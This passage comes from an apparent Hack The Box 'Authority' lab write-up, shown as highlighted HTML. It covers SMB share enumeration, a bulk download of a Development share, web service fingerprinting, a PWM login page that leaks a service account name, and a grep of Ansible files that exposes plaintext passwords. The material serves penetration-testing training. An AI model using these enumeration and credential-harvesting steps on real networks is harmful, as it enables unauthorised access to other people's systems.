<span class="n">SMB</span>         <span class="mf">10.10.11.222</span>    <span class="mi">445</span>    <span class="n">AUTHORITY</span>        <span class="n">Department</span> <span class="n">Shares</span>                 
<span class="n">SMB</span>         <span class="mf">10.10.11.222</span>    <span class="mi">445</span>    <span class="n">AUTHORITY</span>        <span class="n">Development</span>     <span class="n">READ</span>            
<span class="n">SMB</span>         <span class="mf">10.10.11.222</span>    <span class="mi">445</span>    <span class="n">AUTHORITY</span>        <span class="n">IPC</span><span class="err">$</span>            <span class="n">READ</span>            <span class="n">Remote</span> <span class="n">IPC</span>
<span class="n">SMB</span>         <span class="mf">10.10.11.222</span>    <span class="mi">445</span>    <span class="n">AUTHORITY</span>        <span class="n">NETLOGON</span>                        <span class="n">Logon</span> <span class="n">server</span> <span class="n">share</span> 
<span class="n">SMB</span>         <span class="mf">10.10.11.222</span>    <span class="mi">445</span>    <span class="n">AUTHORITY</span>        <span class="n">SYSVOL</span>                          <span class="n">Logon</span> <span class="n">server</span> <span class="n">share</span>
</pre></div>

It works, and upon inspecting the response, we observed that we can read the contents of the <code>Development</code> share. We can access the <code>Development</code> share using tools like <code>smbclient</code>.<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">smbclient</span> <span class="o">//</span><span class="mf">10.10.11.222</span><span class="o">/</span><span class="n">Development</span>
<span class="n">Password</span> <span class="k">for</span> <span class="p">[</span><span class="n">WORKGROUP</span>\<span class="n">elswix</span><span class="p">]:</span> 
<span class="n">Try</span> <span class="s2">"help"</span> <span class="n">to</span> <span class="n">get</span> <span class="n">a</span> <span class="nb">list</span> <span class="n">of</span> <span class="n">possible</span> <span class="n">commands</span><span class="o">.</span>
<span class="n">smb</span><span class="p">:</span> \<span class="o">&gt;</span>
</pre></div>

After navigating through all the directories, I observed a substantial amount of content. Consequently, I decided to download the entire resource:<br/><br/>
<div class="highlight"><pre><span></span><span class="n">smb</span><span class="p">:</span> \<span class="o">&gt;</span> <span class="n">recurse</span> <span class="n">on</span>
<span class="n">smb</span><span class="p">:</span> \<span class="o">&gt;</span> <span class="n">prompt</span> <span class="n">off</span>
<span class="n">smb</span><span class="p">:</span> \<span class="o">&gt;</span> <span class="n">mget</span> <span class="o">*</span>
</pre></div>
<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">ls</span> <span class="o">-</span><span class="n">l</span>
<span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span> <span class="mi">3</span> <span class="n">elswix</span> <span class="n">elswix</span> <span class="mi">4096</span> <span class="n">Dec</span>  <span class="mi">8</span> <span class="mi">11</span><span class="p">:</span><span class="mi">33</span> <span class="n">Automation</span>
</pre></div>

With the <code>find</code> command, we can list the content of all subdirectories:<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">find</span> <span class="o">.</span>
<span class="o">.</span>
<span class="o">./</span><span class="n">Automation</span>
<span class="o">./</span><span class="n">Automation</span><span class="o">/</span><span class="n">Ansible</span>
<span class="o">./</span><span class="n">Automation</span><span class="o">/</span><span class="n">Ansible</span><span class="o">/</span><span class="n">ADCS</span>
<span class="o">./</span><span class="n">Automation</span><span class="o">/</span><span class="n">Ansible</span><span class="o">/</span><span class="n">ADCS</span><span class="o">/</span><span class="n">templates</span>
<span class="o">./</span><span class="n">Automation</span><span class="o">/</span><span class="n">Ansible</span><span class="o">/</span><span class="n">ADCS</span><span class="o">/</span><span class="n">templates</span><span class="o">/</span><span class="n">openssl</span><span class="o">.</span><span class="n">cnf</span><span class="o">.</span><span class="n">j2</span>
<span class="o">./</span><span class="n">Automation</span><span class="o">/</span><span class="n">Ansible</span><span class="o">/</span><span class="n">ADCS</span><span class="o">/</span><span class="n">templates</span><span class="o">/</span><span class="n">extensions</span><span class="o">.</span><span class="n">cnf</span><span class="o">.</span><span class="n">j2</span>
<span class="o">./</span><span class="n">Automation</span><span class="o">/</span><span class="n">Ansible</span><span class="o">/</span><span class="n">ADCS</span><span class="o">/</span><span class="n">molecule</span>
<span class="o">./</span><span class="n">Automation</span><span class="o">/</span><span class="n">Ansible</span><span class="o">/</span><span class="n">ADCS</span><span class="o">/</span><span class="n">molecule</span><span class="o">/</span><span class="n">default</span>
<span class="o">./</span><span class="n">Automation</span><span class="o">/</span><span class="n">Ansible</span><span class="o">/</span><span class="n">ADCS</span><span class="o">/</span><span class="n">molecule</span><span class="o">/</span><span class="n">default</span><span class="o">/</span><span class="n">converge</span><span class="o">.</span><span class="n">yml</span>
<span class="o">./</span><span class="n">Automation</span><span class="o">/</span><span class="n">Ansible</span><span class="o">/</span><span class="n">ADCS</span><span class="o">/</span><span class="n">molecule</span><span class="o">/</span><span class="n">default</span><span class="o">/</span><span class="n">molecule</span><span class="o">.</span><span class="n">yml</span>
<span class="o">./</span><span class="n">Automation</span><span class="o">/</span><span class="n">Ansible</span><span class="o">/</span><span class="n">ADCS</span><span class="o">/</span><span class="n">molecule</span><span class="o">/</span><span class="n">default</span><span class="o">/</span><span class="n">prepare</span><span class="o">.</span><span class="n">yml</span>
<span class="o">./</span><span class="n">Automation</span><span class="o">/</span><span class="n">Ansible</span><span class="o">/</span><span class="n">ADCS</span><span class="o">/.</span><span class="n">ansible</span><span class="o">-</span><span class="n">lint</span>
<span class="o">./</span><span class="n">Automation</span><span class="o">/</span><span class="n">Ansible</span><span class="o">/</span><span class="n">ADCS</span><span class="o">/</span><span class="n">tasks</span>
<span class="o">./</span><span class="n">Automation</span><span class="o">/</span><span class="n">Ansible</span><span class="o">/</span><span class="n">ADCS</span><span class="o">/</span><span class="n">tasks</span><span class="o">/</span><span class="k">assert</span><span class="o">.</span><span class="n">yml</span>
<span class="o">./</span><span class="n">Automation</span><span class="o">/</span><span class="n">Ansible</span><span class="o">/</span><span class="n">ADCS</span><span class="o">/</span><span class="n">tasks</span><span class="o">/</span><span class="n">main</span><span class="o">.</span><span class="n">yml</span>
<span class="o">./</span><span class="n">Automation</span><span class="o">/</span><span class="n">Ansible</span><span class="o">/</span><span class="n">ADCS</span><span class="o">/</span><span class="n">tasks</span><span class="o">/</span><span class="n">init_ca</span><span class="o">.</span><span class="n">yml</span>
<span class="o">./</span><span class="n">Automation</span><span class="o">/</span><span class="n">Ansible</span><span class="o">/</span><span class="n">ADCS</span><span class="o">/</span><span class="n">tasks</span><span class="o">/</span><span class="n">generate_ca_certs</span><span class="o">.</span><span class="n">yml</span>
<span class="o">./</span><span class="n">Automation</span><span class="o">/</span><span class="n">Ansible</span><span class="o">/</span><span class="n">ADCS</span><span class="o">/</span><span class="n">tasks</span><span class="o">/</span><span class="n">requests</span><span class="o">.</span><span class="n">yml</span>
<span class="o">./</span><span class="n">Automation</span><span class="o">/</span><span class="n">Ansible</span><span class="o">/</span><span class="n">ADCS</span><span class="o">/</span><span class="n">meta</span>
<span class="o">./</span><span class="n">Automation</span><span class="o">/</span><span class="n">Ansible</span><span class="o">/</span><span class="n">ADCS</span><span class="o">/</span><span class="n">meta</span><span class="o">/</span><span class="n">preferences</span><span class="o">.</span><span class="n">yml</span>
<span class="o">./</span><span class="n">Automation</span><span class="o">/</span><span class="n">Ansible</span><span class="o">/</span><span class="n">ADCS</span><span class="o">/</span><span class="n">meta</span><span class="o">/</span><span class="n">main</span><span class="o">.</span><span class="n">yml</span>
<span class="o">./</span><span class="n">Automation</span><span class="o">/</span><span class="n">Ansible</span><span class="o">/</span><span class="n">ADCS</span><span class="o">/</span><span class="n">LICENSE</span>
<span class="o">./</span><span class="n">Automation</span><span class="o">/</span><span class="n">Ansible</span><span class="o">/</span><span class="n">ADCS</span><span class="o">/</span><span class="n">requirements</span><span class="o">.</span><span class="n">yml</span>
<span class="o">./</span><span class="n">Automation</span><span class="o">/</span><span class="n">Ansible</span><span class="o">/</span><span class="n">ADCS</span><span class="o">/</span><span class="n">README</span><span class="o">.</span><span class="n">md</span>
<span class="o">./</span><span class="n">Automation</span><span class="o">/</span><span class="n">Ansible</span><span class="o">/</span><span class="n">ADCS</span><span class="o">/.</span><span class="n">yamllint</span>
<span class="o">./</span><span class="n">Automation</span><span class="o">/</span><span class="n">Ansible</span><span class="o">/</span><span class="n">ADCS</span><span class="o">/</span><span class="n">defaults</span>
<span class="o">./</span><span class="n">Automation</span><span class="o">/</span><span class="n">Ansible</span><span class="o">/</span><span class="n">ADCS</span><span class="o">/</span><span class="n">defaults</span><span class="o">/</span><span class="n">main</span><span class="o">.</span><span class="n">yml</span>
<span class="o">./</span><span class="n">Automation</span><span class="o">/</span><span class="n">Ansible</span><span class="o">/</span><span class="n">ADCS</span><span class="o">/</span><span class="nb">vars</span>
<span class="o">./</span><span class="n">Automation</span><span class="o">/</span><span class="n">Ansible</span><span class="o">/</span><span class="n">ADCS</span><span class="o">/</span><span class="nb">vars</span><span class="o">/</span><span class="n">main</span><span class="o">.</span><span class="n">yml</span>
<span class="o">./</span><span class="n">Automation</span><span class="o">/</span><span class="n">Ansible</span><span class="o">/</span><span class="n">ADCS</span><span class="o">/</span><span class="n">tox</span><span class="o">.</span><span class="n">ini</span>
<span class="o">./</span><span class="n">Automation</span><span class="o">/</span><span class="n">Ansible</span><span class="o">/</span><span class="n">ADCS</span><span class="o">/</span><span class="n">SECURITY</span><span class="o">.</span><span class="n">md</span>
<span class="o">./</span><span class="n">Automation</span><span class="o">/</span><span class="n">Ansible</span><span class="o">/</span><span class="n">ADCS</span><span class="o">/</span><span class="n">requirements</span><span class="o">.</span><span class="n">txt</span>
<span class="o">./</span><span class="n">Automation</span><span class="o">/</span><span class="n">Ansible</span><span class="o">/</span><span class="n">SHARE</span>
<span class="o">./</span><span class="n">Automation</span><span class="o">/</span><span class="n">Ansible</span><span class="o">/</span><span class="n">SHARE</span><span class="o">/</span><span class="n">tasks</span>
<span class="o">./</span><span class="n">Automation</span><span class="o">/</span><span class="n">Ansible</span><span class="o">/</span><span class="n">SHARE</span><span class="o">/</span><span class="n">tasks</span><span class="o">/</span><span class="n">main</span><span class="o">.</span><span class="n">yml</span>
<span class="o">./</span><span class="n">Automation</span><span class="o">/</span><span class="n">Ansible</span><span class="o">/</span><span class="n">PWM</span>
<span class="o">./</span><span class="n">Automation</span><span class="o">/</span><span class="n">Ansible</span><span class="o">/</span><span class="n">PWM</span><span class="o">/</span><span class="n">templates</span>
<span class="o">./</span><span class="n">Automation</span><span class="o">/</span><span class="n">Ansible</span><span class="o">/</span><span class="n">PWM</span><span class="o">/</span><span class="n">templates</span><span class="o">/</span><span class="n">context</span><span class="o">.</span><span class="n">xml</span><span class="o">.</span><span class="n">j2</span>
<span class="o">./</span><span class="n">Automation</span><span class="o">/</span><span class="n">Ansible</span><span class="o">/</span><span class="n">PWM</span><span class="o">/</span><span class="n">templates</span><span class="o">/</span><span class="n">tomcat</span><span class="o">-</span><span class="n">users</span><span class="o">.</span><span class="n">xml</span><span class="o">.</span><span class="n">j2</span>
<span class="o">./</span><span class="n">Automation</span><span class="o">/</span><span class="n">Ansible</span><span class="o">/</span><span class="n">PWM</span><span class="o">/</span><span class="n">ansible_inventory</span>
<span class="o">./</span><span class="n">Automation</span><span class="o">/</span><span class="n">Ansible</span><span class="o">/</span><span class="n">PWM</span><span class="o">/</span><span class="n">tasks</span>
<span class="o">./</span><span class="n">Automation</span><span class="o">/</span><span class="n">Ansible</span><span class="o">/</span><span class="n">PWM</span><span class="o">/</span><span class="n">tasks</span><span class="o">/</span><span class="n">main</span><span class="o">.</span><span class="n">yml</span>
<span class="o">./</span><span class="n">Automation</span><span class="o">/</span><span class="n">Ansible</span><span class="o">/</span><span class="n">PWM</span><span class="o">/</span><span class="n">meta</span>
<span class="o">./</span><span class="n">Automation</span><span class="o">/</span><span class="n">Ansible</span><span class="o">/</span><span class="n">PWM</span><span class="o">/</span><span class="n">meta</span><span class="o">/</span><span class="n">main</span><span class="o">.</span><span class="n">yml</span>
<span class="o">./</span><span class="n">Automation</span><span class="o">/</span><span class="n">Ansible</span><span class="o">/</span><span class="n">PWM</span><span class="o">/</span><span class="n">ansible</span><span class="o">.</span><span class="n">cfg</span>
<span class="o">./</span><span class="n">Automation</span><span class="o">/</span><span class="n">Ansible</span><span class="o">/</span><span class="n">PWM</span><span class="o">/</span><span class="n">README</span><span class="o">.</span><span class="n">md</span>
<span class="o">./</span><span class="n">Automation</span><span class="o">/</span><span class="n">Ansible</span><span class="o">/</span><span class="n">PWM</span><span class="o">/</span><span class="n">defaults</span>
<span class="o">./</span><span class="n">Automation</span><span class="o">/</span><span class="n">Ansible</span><span class="o">/</span><span class="n">PWM</span><span class="o">/</span><span class="n">defaults</span><span class="o">/</span><span class="n">main</span><span class="o">.</span><span class="n">yml</span>
<span class="o">./</span><span class="n">Automation</span><span class="o">/</span><span class="n">Ansible</span><span class="o">/</span><span class="n">PWM</span><span class="o">/</span><span class="n">handlers</span>
<span class="o">./</span><span class="n">Automation</span><span class="o">/</span><span class="n">Ansible</span><span class="o">/</span><span class="n">PWM</span><span class="o">/</span><span class="n">handlers</span><span class="o">/</span><span class="n">main</span><span class="o">.</span><span class="n">yml</span>
<span class="o">./</span><span class="n">Automation</span><span class="o">/</span><span class="n">Ansible</span><span class="o">/</span><span class="n">LDAP</span>
<span class="o">./</span><span class="n">Automation</span><span class="o">/</span><span class="n">Ansible</span><span class="o">/</span><span class="n">LDAP</span><span class="o">/</span><span class="n">templates</span>
<span class="o">./</span><span class="n">Automation</span><span class="o">/</span><span class="n">Ansible</span><span class="o">/</span><span class="n">LDAP</span><span class="o">/</span><span class="n">templates</span><span class="o">/</span><span class="n">ldap_sudo_groups</span><span class="o">.</span><span class="n">j2</span>
<span class="o">./</span><span class="n">Automation</span><span class="o">/</span><span class="n">Ansible</span><span class="o">/</span><span class="n">LDAP</span><span class="o">/</span><span class="n">templates</span><span class="o">/</span><span class="n">sssd</span><span class="o">.</span><span class="n">conf</span><span class="o">.</span><span class="n">j2</span>
<span class="o">./</span><span class="n">Automation</span><span class="o">/</span><span class="n">Ansible</span><span class="o">/</span><span class="n">LDAP</span><span class="o">/</span><span class="n">templates</span><span class="o">/</span><span class="n">sudo_group</span><span class="o">.</span><span class="n">j2</span>
<span class="o">./</span><span class="n">Automation</span><span class="o">/</span><span class="n">Ansible</span><span class="o">/</span><span class="n">LDAP</span><span class="o">/</span><span class="n">templates</span><span class="o">/</span><span class="n">ldap_sudo_users</span><span class="o">.</span><span class="n">j2</span>
<span class="o">./</span><span class="n">Automation</span><span class="o">/</span><span class="n">Ansible</span><span class="o">/</span><span class="n">LDAP</span><span class="o">/.</span><span class="n">travis</span><span class="o">.</span><span class="n">yml</span>
<span class="o">./</span><span class="n">Automation</span><span class="o">/</span><span class="n">Ansible</span><span class="o">/</span><span class="n">LDAP</span><span class="o">/</span><span class="n">tasks</span>
<span class="o">./</span><span class="n">Automation</span><span class="o">/</span><span class="n">Ansible</span><span class="o">/</span><span class="n">LDAP</span><span class="o">/</span><span class="n">tasks</span><span class="o">/</span><span class="n">main</span><span class="o">.</span><span class="n">yml</span>
<span class="o">./</span><span class="n">Automation</span><span class="o">/</span><span class="n">Ansible</span><span class="o">/</span><span class="n">LDAP</span><span class="o">/</span><span class="n">TODO</span><span class="o">.</span><span class="n">md</span>
<span class="o">./</span><span class="n">Automation</span><span class="o">/</span><span class="n">Ansible</span><span class="o">/</span><span class="n">LDAP</span><span class="o">/</span><span class="n">meta</span>
<span class="o">./</span><span class="n">Automation</span><span class="o">/</span><span class="n">Ansible</span><span class="o">/</span><span class="n">LDAP</span><span class="o">/</span><span class="n">meta</span><span class="o">/</span><span class="n">main</span><span class="o">.</span><span class="n">yml</span>
<span class="o">./</span><span class="n">Automation</span><span class="o">/</span><span class="n">Ansible</span><span class="o">/</span><span class="n">LDAP</span><span class="o">/.</span><span class="n">bin</span>
<span class="o">./</span><span class="n">Automation</span><span class="o">/</span><span class="n">Ansible</span><span class="o">/</span><span class="n">LDAP</span><span class="o">/.</span><span class="n">bin</span><span class="o">/</span><span class="n">clean_vault</span>
<span class="o">./</span><span class="n">Automation</span><span class="o">/</span><span class="n">Ansible</span><span class="o">/</span><span class="n">LDAP</span><span class="o">/.</span><span class="n">bin</span><span class="o">/</span><span class="n">diff_vault</span>
<span class="o">./</span><span class="n">Automation</span><span class="o">/</span><span class="n">Ansible</span><span class="o">/</span><span class="n">LDAP</span><span class="o">/.</span><span class="n">bin</span><span class="o">/</span><span class="n">smudge_vault</span>
<span class="o">./</span><span class="n">Automation</span><span class="o">/</span><span class="n">Ansible</span><span class="o">/</span><span class="n">LDAP</span><span class="o">/</span><span class="n">README</span><span class="o">.</span><span class="n">md</span>
<span class="o">./</span><span class="n">Automation</span><span class="o">/</span><span class="n">Ansible</span><span class="o">/</span><span class="n">LDAP</span><span class="o">/</span><span class="n">defaults</span>
<span class="o">./</span><span class="n">Automation</span><span class="o">/</span><span class="n">Ansible</span><span class="o">/</span><span class="n">LDAP</span><span class="o">/</span><span class="n">defaults</span><span class="o">/</span><span class="n">main</span><span class="o">.</span><span class="n">yml</span>
<span class="o">./</span><span class="n">Automation</span><span class="o">/</span><span class="n">Ansible</span><span class="o">/</span><span class="n">LDAP</span><span class="o">/</span><span class="nb">vars</span>
<span class="o">./</span><span class="n">Automation</span><span class="o">/</span><span class="n">Ansible</span><span class="o">/</span><span class="n">LDAP</span><span class="o">/</span><span class="nb">vars</span><span class="o">/</span><span class="n">debian</span><span class="o">.</span><span class="n">yml</span>
<span class="o">./</span><span class="n">Automation</span><span class="o">/</span><span class="n">Ansible</span><span class="o">/</span><span class="n">LDAP</span><span class="o">/</span><span class="nb">vars</span><span class="o">/</span><span class="n">main</span><span class="o">.</span><span class="n">yml</span>
<span class="o">./</span><span class="n">Automation</span><span class="o">/</span><span class="n">Ansible</span><span class="o">/</span><span class="n">LDAP</span><span class="o">/</span><span class="nb">vars</span><span class="o">/</span><span class="n">ubuntu</span><span class="o">-</span><span class="mf">14.04</span><span class="o">.</span><span class="n">yml</span>
<span class="o">./</span><span class="n">Automation</span><span class="o">/</span><span class="n">Ansible</span><span class="o">/</span><span class="n">LDAP</span><span class="o">/</span><span class="nb">vars</span><span class="o">/</span><span class="n">redhat</span><span class="o">.</span><span class="n">yml</span>
<span class="o">./</span><span class="n">Automation</span><span class="o">/</span><span class="n">Ansible</span><span class="o">/</span><span class="n">LDAP</span><span class="o">/</span><span class="n">handlers</span>
<span class="o">./</span><span class="n">Automation</span><span class="o">/</span><span class="n">Ansible</span><span class="o">/</span><span class="n">LDAP</span><span class="o">/</span><span class="n">handlers</span><span class="o">/</span><span class="n">main</span><span class="o">.</span><span class="n">yml</span>
<span class="o">./</span><span class="n">Automation</span><span class="o">/</span><span class="n">Ansible</span><span class="o">/</span><span class="n">LDAP</span><span class="o">/</span><span class="n">files</span>
<span class="o">./</span><span class="n">Automation</span><span class="o">/</span><span class="n">Ansible</span><span class="o">/</span><span class="n">LDAP</span><span class="o">/</span><span class="n">files</span><span class="o">/</span><span class="n">pam_mkhomedir</span>
<span class="o">./</span><span class="n">Automation</span><span class="o">/</span><span class="n">Ansible</span><span class="o">/</span><span class="n">LDAP</span><span class="o">/</span><span class="n">Vagrantfile</span>
</pre></div>

Before inspecting these files, let's access the web services hosted on ports <code>80</code> and <code>8443</code>.<br/><br/>
<h3><br>Web Application - Port 80</br></h3><br>
Before accessing the website through our browser, I will run the <code>whatweb</code> scan to discover the technologies and services used by this page.<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">whatweb</span> <span class="o">-</span><span class="n">a</span> <span class="mi">3</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.10.11.222</span>
<span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.10.11.222</span> <span class="p">[</span><span class="mi">200</span> <span class="n">OK</span><span class="p">]</span> <span class="n">Country</span><span class="p">[</span><span class="n">RESERVED</span><span class="p">][</span><span class="n">ZZ</span><span class="p">],</span> <span class="n">HTTPServer</span><span class="p">[</span><span class="n">Microsoft</span><span class="o">-</span><span class="n">IIS</span><span class="o">/</span><span class="mf">10.0</span><span class="p">],</span> <span class="n">IP</span><span class="p">[</span><span class="mf">10.10.11.222</span><span class="p">],</span> <span class="n">Microsoft</span><span class="o">-</span><span class="n">IIS</span><span class="p">[</span><span class="mf">10.0</span><span class="p">],</span> <span class="n">Title</span><span class="p">[</span><span class="n">IIS</span> <span class="n">Windows</span> <span class="n">Server</span><span class="p">]</span>
</pre></div>

The web service hosted on port 80 belongs to Microsoft IIS on Windows Server. It appears to be a default IIS website, so there is no immediate action needed there at the moment.<br/><br/>
<h3><br>Web Application - Port 8443</br></h3><br>
Let's run the <code>whatweb</code> scan on this website:<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">whatweb</span> <span class="o">-</span><span class="n">a</span> <span class="mi">3</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="mf">10.10.11.222</span><span class="p">:</span><span class="mi">8443</span>
<span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="mf">10.10.11.222</span><span class="p">:</span><span class="mi">8443</span> <span class="p">[</span><span class="mi">200</span> <span class="n">OK</span><span class="p">]</span> <span class="n">Country</span><span class="p">[</span><span class="n">RESERVED</span><span class="p">][</span><span class="n">ZZ</span><span class="p">],</span> <span class="n">IP</span><span class="p">[</span><span class="mf">10.10.11.222</span><span class="p">],</span> <span class="n">Meta</span><span class="o">-</span><span class="n">Refresh</span><span class="o">-</span><span class="n">Redirect</span><span class="p">[</span><span class="o">/</span><span class="n">pwm</span><span class="p">]</span>
<span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="mf">10.10.11.222</span><span class="p">:</span><span class="mi">8443</span><span class="o">/</span><span class="n">pwm</span> <span class="p">[</span><span class="mi">302</span> <span class="n">Found</span><span class="p">]</span> <span class="n">Country</span><span class="p">[</span><span class="n">RESERVED</span><span class="p">][</span><span class="n">ZZ</span><span class="p">],</span> <span class="n">IP</span><span class="p">[</span><span class="mf">10.10.11.222</span><span class="p">],</span> <span class="n">RedirectLocation</span><span class="p">[</span><span class="o">/</span><span class="n">pwm</span><span class="o">/</span><span class="p">]</span>
<span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="mf">10.10.11.222</span><span class="p">:</span><span class="mi">8443</span><span class="o">/</span><span class="n">pwm</span><span class="o">/</span> <span class="p">[</span><span class="mi">500</span> <span class="n">Internal</span> <span class="n">Server</span> <span class="n">Error</span><span class="p">]</span> <span class="n">Cookies</span><span class="p">[</span><span class="n">JSESSIONID</span><span class="p">],</span> <span class="n">Country</span><span class="p">[</span><span class="n">RESERVED</span><span class="p">][</span><span class="n">ZZ</span><span class="p">],</span> <span class="n">HTML5</span><span class="p">,</span> <span class="n">HttpOnly</span><span class="p">[</span><span class="n">JSESSIONID</span><span class="p">],</span> <span class="n">IP</span><span class="p">[</span><span class="mf">10.10.11.222</span><span class="p">],</span> <span class="n">Java</span><span class="p">,</span> <span class="n">Title</span><span class="p">[</span><span class="n">PWM</span><span class="p">],</span> <span class="n">X</span><span class="o">-</span><span class="n">UA</span><span class="o">-</span><span class="n">Compatible</span><span class="p">[</span><span class="n">IE</span><span class="o">=</span><span class="mi">10</span><span class="p">]</span>
</pre></div>

Since it is an HTTPS service, we can inspect its certificate using <code>openssl</code>:<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">openssl</span> <span class="n">s_client</span> <span class="o">-</span><span class="n">connect</span> <span class="mf">10.10.11.222</span><span class="p">:</span><span class="mi">8443</span>
</pre></div>

While there doesn't seem to be anything particularly interesting in the certificate, it's worth checking, as sometimes user details can be leaked.<br/><br/>
Upon accessing the website through our browser, we are redirected to the <code>/pwm/private/login</code> section:<br/><br/>
<img alt="" src="https://elswix.github.io/writeups/htb/medium/authority/img/3.png"/><br/><br/>
The <a href="https://github.com/pwm-project/pwm">"PWM Project"</a> refers to an open-source software project that provides a web-based interface for end-users to manage their own passwords, as well as administrators to configure and manage password policies. PWM stands for "Password Policy Management." This project is designed to work with LDAP directories, including those used in conjunction with Active Directory. It aims to enhance password security and simplify the process of password management within organizations. Users can change their passwords and perform other related tasks through a user-friendly web interface provided by PWM.<br/><br/>
Upon entering some random credentials, it returned the following error:<br/><br/>
<img alt="" src="https://elswix.github.io/writeups/htb/medium/authority/img/2.png"/><br/><br/>
It appears that a domain user, <code>svc_ldap</code>, is being leaked. While we may not be able to do much without its credentials, I've saved this information into a file.<br/><br/>
Clicking on <code>Configuration Manager</code> prompts us for a password:<br/><br/>
<img alt="" src="https://elswix.github.io/writeups/htb/medium/authority/img/4.png"/><br/><br/>
Returning to the resources we found in the <code>SMB Share</code>, let's examine its files. Firstly, I used the <code>grep</code> command to filter by the <code>passw</code> string (in case there are passwords stored in these files):<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">grep</span> <span class="o">-</span><span class="n">r</span> <span class="o">-</span><span class="n">i</span> <span class="n">passw</span>
<span class="n">Ansible</span><span class="o">/</span><span class="n">ADCS</span><span class="o">/</span><span class="n">templates</span><span class="o">/</span><span class="n">openssl</span><span class="o">.</span><span class="n">cnf</span><span class="o">.</span><span class="n">j2</span><span class="p">:</span> <span class="n">Passwords</span> <span class="k">for</span> <span class="n">private</span> <span class="n">keys</span> <span class="k">if</span> <span class="ow">not</span> <span class="n">present</span> <span class="n">they</span> <span class="n">will</span> <span class="n">be</span> <span class="n">prompted</span> <span class="k">for</span>
<span class="n">Ansible</span><span class="o">/</span><span class="n">ADCS</span><span class="o">/</span><span class="n">templates</span><span class="o">/</span><span class="n">openssl</span><span class="o">.</span><span class="n">cnf</span><span class="o">.</span><span class="n">j2</span><span class="p">:</span> <span class="n">input_password</span> <span class="o">=</span> <span class="n">secret</span>
<span class="n">Ansible</span><span class="o">/</span><span class="n">ADCS</span><span class="o">/</span><span class="n">templates</span><span class="o">/</span><span class="n">openssl</span><span class="o">.</span><span class="n">cnf</span><span class="o">.</span><span class="n">j2</span><span class="p">:</span> <span class="n">output_password</span> <span class="o">=</span> <span class="n">secret</span>
<span class="n">Ansible</span><span class="o">/</span><span class="n">ADCS</span><span class="o">/</span><span class="n">templates</span><span class="o">/</span><span class="n">openssl</span><span class="o">.</span><span class="n">cnf</span><span class="o">.</span><span class="n">j2</span><span class="p">:</span><span class="n">challengePassword</span>      <span class="o">=</span> <span class="n">A</span> <span class="n">challenge</span> <span class="n">password</span>
<span class="n">Ansible</span><span class="o">/</span><span class="n">ADCS</span><span class="o">/</span><span class="n">templates</span><span class="o">/</span><span class="n">openssl</span><span class="o">.</span><span class="n">cnf</span><span class="o">.</span><span class="n">j2</span><span class="p">:</span><span class="n">challengePassword_min</span>      <span class="o">=</span> <span class="mi">4</span>
<span class="n">Ansible</span><span class="o">/</span><span class="n">ADCS</span><span class="o">/</span><span class="n">templates</span><span class="o">/</span><span class="n">openssl</span><span class="o">.</span><span class="n">cnf</span><span class="o">.</span><span class="n">j2</span><span class="p">:</span><span class="n">challengePassword_max</span>      <span class="o">=</span> <span class="mi">20</span>
<span class="n">Ansible</span><span class="o">/</span><span class="n">PWM</span><span class="o">/</span><span class="n">templates</span><span class="o">/</span><span class="n">tomcat</span><span class="o">-</span><span class="n">users</span><span class="o">.</span><span class="n">xml</span><span class="o">.</span><span class="n">j2</span><span class="p">:</span><span class="o">&lt;</span><span class="n">user</span> <span class="n">username</span><span class="o">=</span><span class="s2">"admin"</span> <span class="n">password</span><span class="o">=</span><span class="s2">"T0mc@tAdm1n"</span> <span class="n">roles</span><span class="o">=</span><span class="s2">"manager-gui"</span><span class="o">/&gt;</span>  
<span class="n">Ansible</span><span class="o">/</span><span class="n">PWM</span><span class="o">/</span><span class="n">templates</span><span class="o">/</span><span class="n">tomcat</span><span class="o">-</span><span class="n">users</span><span class="o">.</span><span class="n">xml</span><span class="o">.</span><span class="n">j2</span><span class="p">:</span><span class="o">&lt;</span><span class="n">user</span> <span class="n">username</span><span class="o">=</span><span class="s2">"robot"</span> <span class="n">password</span><span class="o">=</span><span class="s2">"T0mc@tR00t"</span> <span class="n">roles</span><span class="o">=</span><span class="s2">"manager-script"</span><span class="o">/&gt;</span>
<span class="n">Ansible</span><span class="o">/</span><span class="n">PWM</span><span class="o">/</span><span class="n">ansible_inventory</span><span class="p">:</span><span class="n">ansible_password</span><span class="p">:</span> <span class="n">Welcome1</span>
<span class="n">Ansible</span><span class="o">/</span><span class="n">PWM</span><span class="o">/</span><span class="n">README</span><span class="o">.</span><span class="n">md</span><span class="p">:</span><span class="o">-</span> <span class="n">pwm_root_mysql_password</span><span class="p">:</span> <span class="n">root</span> <span class="n">mysql</span> <span class="n">password</span><span class="p">,</span> <span class="n">will</span> <span class="n">be</span> <span class="nb">set</span> <span class="n">to</span> <span class="n">a</span> <span class="n">random</span> <span class="n">value</span> <span class="n">by</span> <span class="n">default</span><span class="o">.</span>
<span class="n">Ansible</span><span class="o">/</span><span class="n">PWM</span><span class="o">/</span><span class="n">README</span><span class="o">.</span><span class="n">md</span><span class="p">:</span><span class="o">-</span> <span class="n">pwm_pwm_mysql_password</span><span class="p">:</span> <span class="n">pwm</span> <span class="n">mysql</span> <span class="n">password</span><span class="p">,</span> <span class="n">will</span> <span class="n">be</span> <span class="nb">set</span> <span class="n">to</span> <span class="n">a</span> <span class="n">random</span> <span class="n">value</span> <span class="n">by</span> <span class="n">default</span><span class="o">.</span>
